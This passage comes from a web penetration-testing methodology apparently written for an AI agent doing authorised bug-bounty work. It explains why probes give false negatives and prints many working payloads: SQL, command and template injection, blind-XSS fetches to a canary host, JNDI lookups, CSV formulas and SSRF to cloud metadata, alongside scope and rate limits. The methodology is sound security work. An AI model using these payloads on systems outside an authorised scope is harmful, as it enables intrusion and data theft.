inference only". Record the egress test result once in `notes.md`; it governs every blind row in the ledger.

### F.4.4 The callback fired and you were not watching

**Observed.** Nothing in the terminal. Nothing in the log you checked.

**Why it is wrong.** Several mundane mechanisms, all of which look like a clean result:
- The interactsh session ended when the client stopped; the domain no longer correlates. Save and reuse the
  session file so a restart keeps the same domain (`interactsh-client -h` for the exact flag on your build —
  verify, do not guess) and always write `-o` to a file.
- You tailed HTTP interactions and the hit was DNS-only.
- The label was reused, so a resolver cache answered and no query reached the listener (B.7).
- Two collaborator domains in play across the session; you grepped one log.
- The hit came from your own IP — your browser rendered the payload, not the server. That is not a server-side
  finding, and it is also not a negative for the server-side row.

**Disambiguate.**
```bash
# every hit, every protocol, by marker
grep -a -iE 'r0311|dns|http|smtp|ldap' /root/pentest/targets/TARGET/evidence/oob.log | tail -50
# who fired it?
grep -a 'r0311' /root/pentest/targets/TARGET/evidence/oob.log | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u
```
A source IP in the target's egress range confirms server-side. Your own IP means client-side execution.

**Ledger.** A hit you cannot attribute to a row is not `confirmed`; re-send with a fresh unique marker. A
missing hit on a reused label is `untested`, because the query never left the resolver.

### F.4.5 The only channel is email, SMTP or a file

**Observed.** Payload in a name field, no HTTP or DNS callback, no reflection. Nothing.

**Why it is wrong.** Some sinks only ever emit to a non-HTTP channel: the password-reset mail, an SMTP header,
a generated PDF you must download, a log file only visible in an in-app viewer, a webhook you must register
first. The payload executed; the output went to a place with no network callback at all.

**Disambiguate.** Open the channels before concluding:
```
register your own webhook endpoint and read the raw body
use a catch-all / plus-addressed mailbox per canary: you+r0311@yourdomain
read the RAW email source, not the rendered client view (F.6.4)
download the export and inspect bytes: pdftotext out.pdf - | grep -a r0311
check the in-app audit/log viewer for your marker
```

**Ledger.** `untested` for each channel you could not open, listed individually in `Notes`. "No callback" is
only a negative for the channels you actually had.

---

## F.5 Wrong context, wrong payload family

The payload arrived, the sink evaluated it, and it could not possibly have worked because it was written for
a different context. This produces the most confident false negatives, because you did see the payload reach
the app.

### F.5.1 Numeric context — every quote payload is dead on arrival

**Observed.** `id=1'`, `id=1" OR 1=1`, `id=1' OR '1'='1` all return the same 404 or 400. Not injectable.

**Why it is wrong.** In `WHERE id = $v` with no quotes, a quote character makes the statement invalid in a way
the app may catch and convert to a 404, and every quote-based payload fails for the same reason. The correct
test has no quotes in it at all.

**Disambiguate.**
```
1 AND 1=1        vs   1 AND 1=2          boolean pair
1/1              vs   1/0                error oracle, no data touched
2-1              -> returns record 1 = arithmetic evaluated server-side
1*1              -> same record as 1
0x1              -> MySQL hex literal for 1
1--              -> trailing comment accepted
1/**/AND/**/1=1  -> if spaces are stripped or blocked
1&&1=1           -> if AND is blocked (URL-encode the &)
```
`id=2-1` returning record 1 is the single cleanest proof of a numeric context that exists. If the app returns
record 2, the value was cast to an integer before the query, and *that* is your negative.

**Ledger.** A numeric vector tested only with quote payloads is `untested`. Record `2-1` and the boolean pair
as the evidence, or the row does not close.

### F.5.2 Windows and no-shell execution

**Observed.** `;id`, `&&id`, `|id`, `$(id)` — nothing. Command injection closed.

**Why it is wrong.** Two different mechanisms:
- On Windows there is no `id`, `;` is not a separator in `cmd.exe`, and `$(...)` means nothing. `&`, `|`,
  `&&`, `||` and `%0a` work; the commands are `whoami`, `hostname`, `dir`.
- On any OS, if the code calls an exec API that takes an argument *array* and no shell
  (`Runtime.exec(String[])`, `ProcessBuilder`, Python `subprocess` with `shell=False`, Go `exec.Command`,
  Node `execFile`/`spawn` without `shell:true`), no metacharacter will ever work. The separator test is
  meaningless there — the live bug is **argument injection**: your value becomes another flag for the binary.

**Disambiguate.** Windows family:
```
& whoami
| whoami
&& whoami
%0awhoami
"&whoami&"
' & whoami & '
```
No-shell family — attack the program's own flags. Which flags depend on the binary; identify it from the
feature (thumbnailer, PDF renderer, archiver, mailer, git integration):
```
--help                              a help/usage string in the output or error proves flag parsing
-o /tmp/r0142.txt                   output redirection
@/etc/hostname                      curl-style file read into a parameter
--use-compress-program=id           tar
-dSAFER- / -sOutputFile=            ghostscript
--upload-file / -K /dev/stdin       curl
-X GET file:///etc/passwd           curl-as-fetcher
--output-document=/tmp/x            wget
```
Also try `\n` as the separator (`%0a`) — some sinks split on newlines even without a shell.

**Ledger.** Separator-only probing on a suspected exec sink leaves the row `untested`. You owe an argument
injection attempt (3.3) and, when the sink is blind, an OOB flag (F.4.1).

### F.5.3 Template engines that do not do what your probe assumes

**Observed.** `{{7*7}}` renders literally, or renders as nothing. No SSTI.

**Why it is wrong.** `7*7` is a Jinja2/Twig/Freemarker-shaped probe. Several widely-deployed engines cannot
evaluate it and are still injectable:

| Engine | `{{7*7}}` result | What actually proves evaluation |
|---|---|---|
| Go `text/template` / `html/template` | parse error, usually a 500 — **not** `49` | `{{.}}` dumps the context; `{{printf "%d" 49}}`; a 500 on `{{` alone is the signal |
| Handlebars / Mustache (logic-less) | empty output | `{{this}}`, `{{#with x}}`, a missing-helper error on `{{#foo}}` |
| Django templates | literal, no arithmetic (by design) | `{% debug %}`, `{{x|length}}`, `{{x|date:'ARG'}}` filter-argument injection, `{{request.META}}` if `request` is in context |
| Jinja2 | `49` | `{{7*'7'}}` → `7777777` (Jinja) vs `49` (Twig) — use it to tell them apart |
| ERB / Erubi (Ruby) | literal | `<%= 7*7 %>` |
| Razor (.NET) | literal | `@(7*7)` |
| Velocity / Freemarker | literal for `{{...}}` | `#set($x=7*7)$x` / `${7*7}` |
| Thymeleaf (SpEL) | literal | `${7*7}`, `__${7*7}__::.x` preprocessing form |
| Smarty | `{7*7}` evaluates in Smarty 3 (verify on target) | `{$smarty.version}`, `{$smarty.const...}` |

Also: the engine may evaluate and the output may not be in the response you read — it may be in a PDF, an
email, or a filename (F.6).

**Disambiguate.** Send the engine-agnostic polyglot from 3.22 once, read the raw response, and note which
syntax produced an error rather than which produced `49`:
```
${{<%[%'"}}%\.
${7*7}#{7*7}{{7*7}}<%=7*7%>@(7*7)%{7*7}[[${7*7}]]{7*7}
```
An error or 500 from one of the delimiters is the finding; `49` is a bonus.

**Ledger.** A single `{{7*7}}` is not an SSTI test. The row needs the delimiter set for the stack you
fingerprinted in 2.2 plus the error outcomes recorded.

### F.5.4 Identifier context — you used the wrong quote character

**Observed.** The quote parity ladder is clean on `'` for a `sort`, `fields` or filter-key parameter. Negative.

**Why it is wrong.** In an identifier position the string-literal quote is not the delimiter. Which character
is depends on the DB, and on MySQL it also depends on `sql_mode`: with `ANSI_QUOTES` enabled, `"` is an
identifier quote and not a string quote, so a `"`-based probe behaves nothing like the same probe on the same
server without it. Verify the DB from the fingerprint probes in 3.1 rather than assuming.

| Context | Delimiter | Parity ladder |
|---|---|---|
| MySQL/MariaDB identifier | backtick | `` col` `` / `` col`` `` / `` col``` `` |
| Postgres / Oracle / MSSQL identifier | `"` | `col"` / `col""` / `col"""` |
| MSSQL bracket identifier | `[ ]` | `col]` / `col]]` |
| MySQL JSON path (`JSON_EXTRACT(c,'$."K"')`) | `"` inside a `'`-quoted path | `K"` , `K"."a` , `K")) OR 1=1-- -` |
| Postgres jsonb path (`c#>'{K}'`) | `}` and `'` | `K}` , `K,a}` , `K}'::text[] --` |
| Mongo dotted field path | `.` and `$` | `K.a` , `$K` , `K"` |

**Disambiguate.** Run the ladder once per delimiter family on the same parameter; three requests each, nothing
else changed. An unknown-column error that echoes your key back is the best outcome — it confirms
concatenation and gives you an error oracle (4.20).

**Ledger.** A ladder with the wrong delimiter is not evidence. Record which delimiters you tried; if you tried
only `'` on an identifier-shaped vector (shape S3 in 2.5), the row is `untested`.

### F.5.5 JSON-path and document-path contexts only exercise the path parser

**Observed.** Injecting `$`, `.`, `[`, `]`, `*` into a filter key gives errors. You call it "input validation"
and close the row.

**Why it is wrong.** Those errors may come from the path parser inside the DB or the ORM, which is a component
you reached — the errors prove your input is being *parsed as a path*, which is exactly the concatenated
position. The next step is to escape the path string and get back into SQL, not to stop.

**Disambiguate.** Escalate from path metacharacters to path-string escape:
```
key=a.b                    does nesting work? (path parser reached)
key=a[0]                   array index accepted?
key=$.a                    explicit root accepted?
key=a"                     break the path's own quoting (MySQL JSON path)
key=a"))%20OR%201=1--%20-  break out of JSON_EXTRACT(...) entirely
key=a}                     Postgres jsonb path array literal break
key=a', (SELECT 1))--      close the function call
```
Match on the *shape* of the error, not an exact string: a path-syntax error names the path or its position; a
SQL-syntax error names SQL tokens or a line/character offset. If the message changes family between two of
those payloads, you crossed from the path parser into the statement.

**Ledger.** Path-parser errors are `suspicious`, not negative. Note which payload changed the error family.

### F.5.6 A failed stacked query proves nothing

**Observed.** `'; SELECT 1-- -` errors or does nothing, so you conclude there is no injection.

**Why it is wrong.** Stacked-query support is a property of the driver and protocol, not of the injection:
MSSQL generally allows them; PostgreSQL allows multiple statements only when the driver uses the simple query
protocol, not with parameter binding; MySQL through mysqli/PDO usually refuses, though PDO with emulated
prepares sometimes accepts them; Oracle needs an anonymous `BEGIN ... END;` block. Verify on target via the
fingerprint probes rather than assuming. A single-statement injection is fully exploitable without stacking.

**Disambiguate.** Drop stacking and test in-statement:
```
' UNION SELECT NULL,NULL-- -            column-count ladder
' AND (SELECT SUBSTR(version(),1,1))='P'-- -   boolean, Postgres
' AND 1=CAST(version() AS int)-- -      error-based leak (Postgres)
' AND (SELECT 1 FROM dual)=1-- -        Oracle shape
```
RISK: never use a stacked statement that writes. `../CLAUDE.md` 2 — stacked proof stops at a `SELECT`.

**Ledger.** The row's state comes from in-statement probes. "Stacked query rejected" belongs in `Notes`, not
in the state column.

### F.5.7 NoSQL: the ODM cast your operator object away

**Observed.** `{"user":{"$ne":null}}` returns a cast error or 400. `{"user":{"$gt":""}}` same. No NoSQL
injection.

**Why it is wrong.** Mongoose and similar ODMs cast a value to the declared schema type, so an object where a
`String` is declared is rejected — by the ODM, before the query. The bug lives where the schema does not
constrain the shape: a `Mixed`/`Any`/`Object` field, a raw `find(req.body)` passthrough, an aggregation
pipeline stage built from input, a `$where`/`$expr`, a search-DSL passthrough (Elasticsearch `query` objects),
or the *key* position rather than the value.

**Disambiguate.**
```
value position, typed field:   likely dead — record it and move on
key position:                  {"user[$ne]":null} (form encoding), {"$where":"1==1"}, {"user.$ne":null}
operator in a nested filter:   {"filter":{"user":{"$regex":"^a"}}}  -> different result set = live
passthrough endpoints:         /search with {"query":{"term":{"KEY":"v"}}}  -> KEY is the injection (3.2)
aggregation:                   {"pipeline":[{"$match":{...}}]} if the API takes stages
```
RISK: no `$regex` with catastrophic patterns and no `$where` loops — ReDoS/DoS is out of scope
(`../CLAUDE.md` 2). Use anchored short regexes only.

**Ledger.** A typed-value negative closes the value row only. Key, operator and passthrough rows are separate.

### F.5.8 Your value is inside quotes you did not account for

**Observed.** `;id` in a filename or search field does nothing. `' OR 1=1` in a shell-adjacent field does
nothing.

**Why it is wrong.** The sink wraps your value in its own quoting: `sh -c "convert '<file>' out.png"` or
`LIKE '%<v>%'`. You must close the wrapper before your syntax means anything, and the wrapper's quote may not
be the one you tried.

**Disambiguate.**
```
shell, single-quoted:   ' ; id ; '          and   '"'"'; id; #
shell, double-quoted:   " ; id ; "          and   $(id)  `id`  (work inside double quotes)
LIKE wrapper:           %' AND 1=1-- -      and   a%' OR '1'='1
regex wrapper:          .*)(.*  / unbalanced paren to force an error
```
The cheapest tell is an *error*: send a single unbalanced quote of each family and watch for a 500 or a changed
error family. That tells you which wrapper is there before you spend payloads.

**Ledger.** If you never established the wrapper, the row is `untested`. Record the wrapper in `Notes` once —
it applies to every payload family on that vector.

---

## F.6 Second-order blindness

`../CLAUDE.md` 6.7 says re-crawl after every write. These are the specific ways a re-crawl still misses.

### F.6.1 You checked the renderer, not the storage

**Observed.** You stored `<svg onload=alert(1)>`, reloaded the page, and the payload is not in the HTML. The
output is escaped.

**Why it is wrong.** You cannot tell escaping from stripping without reading the stored value. If the app
stripped `<` at write time, the renderer is untested, and the renderer is what matters for the other seventeen
render sites. Worse, the write-time filter may be weaker than you think (strips `<script` but not `<svg`), and
you will never know while you are reading only HTML.

**Disambiguate.** Read the value back through a different serializer than the page:
```bash
curl -sS -H 'Cookie: session=...' -H 'Accept: application/json' \
  'https://TARGET/api/v1/profile' | jq -r '.lastName' | xxd | head
```
| Stored bytes | Conclusion |
|---|---|
| Exactly what you sent | storage is raw → every render site is a live test; walk the 3.21 table |
| HTML-escaped (`&lt;svg`) | escaped at write → look for a consumer that decodes (exports, emails) |
| Truncated or stripped | the write filter fired → F.3.4 / F.1.8, the renderer is still `untested` |

**Ledger.** One escaped render site is one negative row. It is not a negative for the field.

### F.6.2 The render site you could not reach

**Observed.** Admin view, second tenant's dashboard, the ops log viewer, a partner API. You have no account.
The sweep ends and the row reads `tested-negative`.

**Why it is wrong.** There is no payload and no response for that render site, so by 6.2 there is nothing to
record and no negative to write. Blind XSS into an admin panel is one of the highest-paying second-order bugs
and it lives exactly here.

**Disambiguate.** Substitute an out-of-band proof for the access you do not have:
```
<script src=//r0311-admin-xss.CANARY/></script>
<img src=x onerror="fetch('//r0311-admin-xss.CANARY/?c='+document.domain)">
{{7*7}}<!--r0311-admin-ssti-->          plus a network-bearing SSTI form from 3.4
${jndi:ldap://r0311-adminlog-jndi.CANARY/x}    for log viewers (3.18)
```
Store it, keep the listener running 24h+ (F.4.2), and ask the user for the extra role if the program provides
one (`../CLAUDE.md` 4).

**Ledger.** `untested` plus "render site unreachable: no A2 account", or `suspicious` if a canary is planted
and pending. Report the coverage gap in the count honestly.

### F.6.3 The export uses a different engine with no escaping

**Observed.** The web view is escaped and you closed the field.

**Why it is wrong.** Exports are usually written by a separate library with a separate (or absent) escaping
model, and often by a different team. The HTML path goes through the template engine's auto-escape; the CSV
path is string concatenation; the PDF path is an HTML-to-PDF renderer that will happily fetch remote
resources; the XLSX path is a zip of XML.

| Export | Engine difference | Probe |
|---|---|---|
| CSV | no escaping concept at all; the *client* is the interpreter | `=1+1`, `=HYPERLINK("http://r0311.CANARY/","x")`, `@SUM(1+1)`, `+1+1`, `-1+1`, leading `\t=1+1` |
| XLSX | zip + XML; formula cell and OOXML external refs | `=1+1`; check for XXE on *ingest* (3.6) |
| PDF (HTML-to-PDF) | headless browser or wkhtml — SSRF and local file read | `<iframe src=http://169.254.169.254/>` (RISK: cloud metadata — confirm in scope first), `<img src=//r0311.CANARY/>`, `<script>` executes in some renderers |
| Email | HTML built by string concat, then rendered in a client | `<a href="http://r0311.CANARY/">x</a>`, CRLF into headers (3.12) |
| Markdown/BBCode view | separate parser, different allow-list | `[x](javascript:alert(1))`, `<details open ontoggle=alert(1)>` |
| ICS / vCard / XML feed | no escaping, CRLF-delimited | `%0d%0aSUMMARY:injected` |

**Disambiguate.** Download the artefact and grep the bytes, do not look at a preview:
```bash
curl -sS -H 'Cookie: session=...' -o /tmp/claude-0/e.csv 'https://TARGET/export?fmt=csv'
grep -an 'r0311' /tmp/claude-0/e.csv | head            # -a: do not skip a "binary" file
unzip -p /tmp/claude-0/e.xlsx xl/sharedStrings.xml | grep -o 'r0311[^<]*'
pdftotext /tmp/claude-0/e.pdf - | grep -an 'r0311'
```
`grep` without `-a` prints "Binary file matches" or nothing on a response containing NUL bytes. That alone has
produced false negatives.

**Ledger.** One row per export format per field. The HTML row's negative does not transfer.

### F.6.4 The email rendered it and you read the wrong copy

**Observed.** The notification mail arrived and the payload is not there.

**Why it is wrong.** You looked at the rendered message in a mail client. Clients strip scripts, rewrite
`href`s, block remote images by default and collapse whitespace — all of which hides a payload that is
present in the source. The finding is in the raw MIME, and the security impact is in the source, not in
Gmail's rendering.

**Disambiguate.** Read the raw source and both MIME parts:
```
in a webmail client: "Show original" / "View source", then search for your marker
check both text/plain and text/html parts — the HTML part is usually the unescaped one
check headers for CRLF injection: Subject:, To:, Reply-To:, X-* (3.12)
if remote images are blocked, that is your client, not the app — the <img src> is still the finding
```
Use a plus-addressed or catch-all mailbox per canary so you can attribute a late mail (F.4.2).

**Ledger.** A rendered-client inspection is not evidence. The row needs the raw source saved to `evidence/`.

### F.6.5 Escaped in the one place you looked, raw in three others

**Observed.** The record view escapes your payload. Field closed.

**Why it is wrong.** Different templates render the same field, and they do not share an escaping strategy:
the detail view uses server-side auto-escape; the list view is built in JS with `innerHTML`; the edit form puts
the value in an attribute; the tooltip/`title` attribute is concatenated; the search snippet highlights matches
by inserting `<mark>` into the raw string (which usually means it works on unescaped input); the OpenGraph
`<meta content="...">` takes the same field; the `<title>` tag does too.

**Disambiguate.** Search the DOM, not the HTTP body, and check every surface:
```bash
# server-rendered HTML
curl -sS -H 'Cookie: session=...' 'https://TARGET/records' | grep -n 'r0311' | head
# what the JSON API hands the client (the innerHTML source)
curl -sS -H 'Cookie: session=...' 'https://TARGET/api/records?per_page=5' | grep -o 'r0311.\{0,60\}'
```
Then in a browser: view the rendered DOM for the list view, the edit form's `value=`, `document.title`, any
`data-*` attribute, and the tooltip. A value that is `&lt;svg...` in the HTTP body and `<svg...` in the DOM is
double-decoded client-side — that is a live sink.

**Ledger.** Render sites are rows. Close them individually.

### F.6.6 The write did not actually store what you think

**Observed.** You POSTed payload v2, re-walked the render sites, saw v1's harmless remnant, and concluded the
new payload is filtered.

**Why it is wrong.** Common mechanisms: the update was idempotency-keyed or deduped and silently ignored; a
`PATCH` needed a field you omitted and the server kept the old value; validation failed on an unrelated field
and the whole object was rejected with a 200; there is a draft/published split and you edited the draft while
the render site shows published; a cache or CDN is serving the old render (F.2.2).

**Disambiguate.** After every write, read back and compare before drawing any conclusion:
```bash
curl -sS -H 'Cookie: session=...' 'https://TARGET/api/records/123' | jq -r '.field' | md5sum
# compare with the md5 of exactly what you sent
```
If they differ, nothing downstream is testable yet. Also force publication/state change if there is one, and
cache-bust the render site.

**Ledger.** `untested` until the read-back matches. This is the failure that quietly invalidates a whole
second-order pass.

---

## F.7 Disclosure-specific false negatives

Cross-reference `02-info-disclosure.md`. These are the negatives that close a disclosure row that is actually
live.

### F.7.1 A 403 means the path exists

**Observed.** `GET /.git/config` → 403. You record "protected, not exposed".

**Why it is wrong.** A 403 from the origin is usually a rule matching a *pattern*, and the rule is rarely
complete. The 403 also tells you the directory is on disk — a 404 would not. Repo recovery needs
`/.git/HEAD`, `/.git/index`, `/.git/logs/HEAD` and the object/pack files, not `config`.

**Disambiguate.** Probe the path set, plus normalisation variants, each with its own control (F.2.1):
```
/.git/HEAD            /.git/index          /.git/logs/HEAD      /.git/ORIG_HEAD
/.git/packed-refs     /.git/refs/heads/main
/.git/objects/info/packs                   /.git/COMMIT_EDITMSG
/.GIT/config          /.git//config        /.git/./config       /%2egit/config
/.git/config?         /.git/config;        /.git/config%20      /.git/config.
```
Same shape for every protected path: `.env` → `.env.local`, `.env.production`, `.env.bak`, `.env.save`,
`env.js`; `.svn` → `/.svn/wc.db`, `/.svn/entries`; `.DS_Store` in every directory, not just root.

| Result | Meaning |
|---|---|
| 403 on one path, 200 on a sibling | rule is incomplete → fetch, then 4.4 for recovery |
| 403 on all, 404 on the control | directory exists and is blanket-protected → note it, still `suspicious` |
| 403 identical to a 403 for a nonsense path | edge rule matching a prefix, tells you nothing |

**Ledger.** `suspicious` while any sibling path is untried. 403 is never a negative (6.6).

### F.7.2 A 200 that is not the file

**Observed.** `/.env` returns 200. You report an exposed env file. Or the inverse: `/swagger.json` returns 200
with the SPA shell and you assume the spec is there and move on.

**Why it is wrong.** SPA catch-alls and custom error pages return 200 with `text/html`. The status is not the
evidence; the bytes are.

**Disambiguate.**
```bash
curl -sS -D - -o /tmp/claude-0/f.bin 'https://TARGET/.env' | grep -iE '^(HTTP|content-type|content-length)'
head -c 200 /tmp/claude-0/f.bin; echo
file /tmp/claude-0/f.bin
```
`text/html` plus `<!doctype html>` plus the app's shell = not the file. `text/plain`/`application/json` with
matching content = the file. Also compare the length with the SPA index's length from your baseline.

**Ledger.** A 200 you did not inspect the body of is `untested`.

### F.7.3 Probing the index path instead of the endpoints

**Observed.** `/actuator` → 404, so Spring Actuator is "not exposed". `/swagger` → 404, so there are no API
docs. `/debug` → 404, so no debug endpoints.

**Why it is wrong.** The index/discovery page is frequently not exposed while individual endpoints are. Spring
Boot's exposure list is per-endpoint, the base path is configurable, and older versions used flat paths. Same
logic for docs: the UI route and the spec route are different, and versions differ.

**Disambiguate.** Probe path by path, with a control each time:
```
/actuator/health   /actuator/info   /actuator/env   /actuator/configprops   /actuator/mappings
/actuator/beans    /actuator/metrics /actuator/loggers /actuator/threaddump  /actuator/httptrace
/actuator/heapdump                       RISK: large download and it contains live tokens and real user
                                         data. Prove existence with a HEAD or a ranged request and stop;
                                         `../CLAUDE.md` 4 says report, do not hoard.
alternate bases:  /manage/...  /admin/actuator/...  /management/...  /_actuator/...
Boot 1 flat:      /env  /dump  /trace  /beans  /configprops  /metrics  /health
docs:             /v3/api-docs  /v2/api-docs  /openapi.json  /swagger/v1/swagger.json
                  /swagger-ui/index.html  /api-docs  /docs  /redoc  /graphql?sdl
```
```bash
curl -sSI 'https://TARGET/actuator/heapdump' | grep -iE '^(HTTP|content-length|content-type)'
```

**Ledger.** One 404 on an index path closes one row. The per-endpoint rows are separate and start `untested`.

### F.7.4 "Introspection is disabled" is not "no schema"

**Observed.** `{"query":"{__schema{types{name}}}"}` returns an error. You record the GraphQL schema as not
recoverable.

**Why it is wrong.** Introspection is one of several schema channels. Field-suggestion errors leak names one
at a time (4.9). `__type(name:"User")` sometimes answers when `__schema` does not. On an Apollo Federation
subgraph, `{_service{sdl}}` returns the entire SDL and is not gated by the introspection flag (verify on
target — it only applies to federated subgraphs). And the client bundle contains every operation the UI uses.

**Disambiguate.**
```bash
G='https://TARGET/graphql'; H='Content-Type: application/json'
curl -sS -X POST -H "$H" -d '{"query":"{__type(name:\"User\"){name fields{name}}}"}' "$G" | jq .
curl -sS -X POST -H "$H" -d '{"query":"{_service{sdl}}"}' "$G" | jq -r '.data._service.sdl' | head
curl -sS -X POST -H "$H" -d '{"query":"{user{emai}}"}' "$G" | jq -r '.errors[].message'
curl -sS      -H "$H" "$G?query=%7B__schema%7Btypes%7Bname%7D%7D%7D" | head -c 300   # GET vs POST
# and mine the bundles for whole documents
grep -oE '(query|mutation|subscription)[[:space:]]+[A-Za-z0-9_]+[^`"'"'"']{0,400}' /path/to/bundle.js | head
```
Match the suggestion error on its *shape* (a message naming your misspelled field and offering alternatives),
not on an exact string — wording differs across server implementations.

RISK: suggestion brute force is request-heavy. 5 req/s, a few hundred candidates, stop when you have the shape
(4.9).

**Ledger.** `tested-negative` only after all of: `__schema`, `__type`, `_service{sdl}`, GET-vs-POST, a
suggestion probe, and bundle mining. Record which ones you ran.

### F.7.5 No `.map` file does not mean no source

**Observed.** `main.4f2a.js.map` → 404. Source maps not exposed.

**Why it is wrong.** Maps are per-chunk, and the interesting code is usually in a lazily loaded route chunk,
not the entry bundle. Maps can also be inlined as a `data:` URI at the tail of the bundle, hosted on a
different path or CDN host, or present for vendor chunks only. And even with no map at all, the bundle itself
carries original file names, route tables, feature flags, role names and endpoints.

**Disambiguate.**
```bash
B=/tmp/claude-0/bundle.js
# 1. explicit pointer, always check the tail
tail -c 400 "$B" | grep -o 'sourceMappingURL=.*'
# 2. inline map as a data URI
grep -o 'sourceMappingURL=data:application/json;[^"]*base64,[A-Za-z0-9+/=]\{100,\}' "$B" | head -c 200
# 3. enumerate every chunk the app can load, then try .map on each
grep -oE '[a-zA-Z0-9_./-]+\.[0-9a-f]{6,}\.(js|mjs)' "$B" | sort -u
# 4. original paths even with no map
grep -oE '(webpackChunkName|__webpack_require__\.p)[^,]{0,80}' "$B" | head
jsluice urls -R "$B" | head -50
```
Also try `.js.map` on the CDN host and on the origin (they can differ), and check `/static/js/*.LICENSE.txt`,
which sometimes lists internal package names.

**Ledger.** One 404 on one map closes one row (that chunk). Every other chunk is its own row.

### F.7.6 `ListBucket` denied while objects are readable

**Observed.** `https://bucket.s3.amazonaws.com/` returns `AccessDenied`. You record the bucket as private.

**Why it is wrong.** Listing and reading are separate permissions. A bucket that denies listing can still serve
every object to anyone who knows the key — and keys are in the app's HTML, its JS, its API responses, archived
URLs and recovered source maps.

**Disambiguate.** Harvest keys, then fetch them:
```bash
# keys from what you already have
grep -ohrE 'https?://[a-z0-9.-]*(s3[.-][a-z0-9-]*\.amazonaws\.com|storage\.googleapis\.com|blob\.core\.windows\.net)/[^"'"'"' )]+' \
  /root/pentest/targets/TARGET/evidence/ | sort -u | head -50
gau --subs TARGET 2>/dev/null | grep -iE 's3|storage\.googleapis|blob\.core' | sort -u | head -50
# read one known key, both URL styles
curl -sSI 'https://bucket.s3.amazonaws.com/uploads/known-file.png'
curl -sSI 'https://s3.amazonaws.com/bucket/uploads/known-file.png'
# region and existence hints come back even in the denial
curl -sSI 'https://bucket.s3.amazonaws.com/' | grep -i 'x-amz'
```
Predictable-key patterns matter more than listing: sequential IDs, user IDs, `invoice-<n>.pdf`, timestamps.
RISK: stay in scope — a bucket is a third-party host unless the program names it (`../CLAUDE.md` 2). Read one
object as proof, no bulk download, no writes.

**Ledger.** `AccessDenied` on listing = one negative row for listing. Object read is a separate row.

### F.7.7 The verbose error exists, just not on the path you tried

**Observed.** All errors are generic. No stack traces anywhere.

**Why it is wrong.** Error verbosity varies by path, by content type, by status class and by which layer
handled the request. Common splits: the WAF or CDN replaces 5xx bodies while the origin returns a full trace;
the JSON API returns a generic envelope while an HTML route returns a framework page; an unhandled type error
in a rarely used endpoint escapes the global handler; the `Accept` header decides which handler formats the
error; a `HEAD` or an unusual method reaches a different branch.

**Disambiguate.** Vary the trigger, not just the payload:
```bash
U='https://TARGET/api/x'
curl -sS -X POST -H 'Content-Type: application/json' -d '{' "$U" | head -c 300           # malformed JSON
curl -sS -X POST -H 'Content-Type: application/xml'  -d '<a>' "$U" | head -c 300          # wrong type
curl -sS -X PATCH "$U" | head -c 300                                                      # unusual method
curl -sS -H 'Accept: application/xml' "$U" | head -c 300                                  # content negotiation
curl -sS "$U?id[]=1" | head -c 300                                                        # array where scalar expected
curl -sS "$U?id=99999999999999999999" | head -c 300                                       # numeric overflow
curl -sS -H 'Content-Type: application/json' -d '{"id":{"a":1}}' "$U" | head -c 300        # type confusion
```
If the edge is scrubbing, compare against the origin when you have it (B.5 origin discovery) — same request,
different responder.

**Ledger.** One generic error from one trigger is not a negative for 4.7. Record the trigger set you used.

---

## F.8 Tooling false negatives

`../CLAUDE.md` 8: a scanner hit is `suspicious` until reproduced. The other half of that rule is the one people
forget — a scanner *miss* is not a negative at all.

### F.8.1 sqlmap cannot model the sink

**Observed.** `sqlmap` finished, "all tested parameters do not appear to be injectable". Row closed.

**Why it is wrong.** sqlmap tests values in positions it understands. It does not model: a filter **key** that
becomes a column name or JSON path (3.1 high-yield vector), a JSON body it was not given an injection marker
for, GraphQL variables, nested object keys, a multipart filename, an identifier context needing a backtick or
bracket, or a second-order sink. And the house flag set removes techniques on purpose:
`--technique=BEUS` excludes time-based (`T`), so a purely time-blind injection is invisible by configuration.

**Disambiguate.** Point it at the right position and re-check the run log:
```bash
# mark the injection point explicitly with * inside a saved request
sqlmap -r /root/pentest/targets/TARGET/evidence/req.txt --batch --level 2 --risk 1 \
  --delay 0.2 --threads 1 --technique=BEUS \
  --output-dir=/root/pentest/targets/TARGET/evidence/sqlmap
# identifier / ORDER BY context needs the surrounding syntax supplied
sqlmap ... -p sort --prefix 'id,' --suffix '-- -'
# did the run actually reach the app?
grep -icE 'sign in|login|csrf|403|429' /root/pentest/targets/TARGET/evidence/sqlmap/TARGET/log
```
Signs the run was worthless: every request 403 or 429, "target URL content is not stable", a CSRF token it
never refreshed, or a session that expired (add `--csrf-token`, `--csrf-url`, `--cookie`, `--safe-url`).

**Ledger.** A sqlmap miss is worth one line in `Notes`. The row's state comes from your hand probes — the
parity ladder and a boolean pair — not from the tool.

### F.8.2 nuclei clean because nothing covers the sink

**Observed.** `nuclei` ran clean, so no known issues.

**Why it is wrong.** nuclei matches known signatures on known paths. There is no template for your app's
`labels[].key`, and the house flag set excludes whole families on purpose (`-etags dos,fuzz,intrusive` removes
the fuzzing templates). Templates also go stale, and an unauthenticated run against an authenticated app tests
the login page repeatedly.

**Disambiguate.**
```bash
nuclei -update-templates
# confirm the run was authenticated and actually hit the app
nuclei -u https://TARGET -H 'Cookie: session=...' -H 'X-Bug-Bounty: HANDLE' \
  -rl 5 -c 5 -timeout 10 -etags dos,fuzz,intrusive -stats -v -o /root/.../nuclei.txt
# how many requests got a login page or a 403?
grep -cE '\[403\]|\[401\]|\[429\]' /root/.../nuclei.txt
```

**Ledger.** "nuclei clean" never sets a row state. It is breadth, not coverage.

### F.8.3 The fuzz run was mostly 429s and you only read the hits

**Observed.** `ffuf` found nothing. Wordlist exhausted, no results.

**Why it is wrong.** With `-fc 404` and no view of the status distribution, a run that turned into 30,000
rate-limited responses looks the same as a run that found nothing. Auto-calibration (`-ac`) can also filter out
genuine 200s whose length resembles the soft-404 baseline.

**Disambiguate.** Always record everything, then look at the distribution before the hits:
```bash
ffuf -u 'https://TARGET/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -H 'X-Bug-Bounty: HANDLE' -rate 5 -t 5 -p 0.1 -timeout 10 -mc all \
  -o /root/pentest/targets/TARGET/evidence/ffuf-all.json -of json
jq -r '.results[].status' /root/pentest/targets/TARGET/evidence/ffuf-all.json | sort -n | uniq -c | sort -rn
jq -r '.results[] | "\(.status) \(.length) \(.url)"' /root/pentest/targets/TARGET/evidence/ffuf-all.json \
  | sort -k2 -n | uniq -c -f1 | sort -rn | head -20     # length histogram: outliers are the findings
```
Any 429 or 503 in the distribution invalidates the run from that point on. Back off to 1 req/s and re-run
(`../CLAUDE.md` 2).

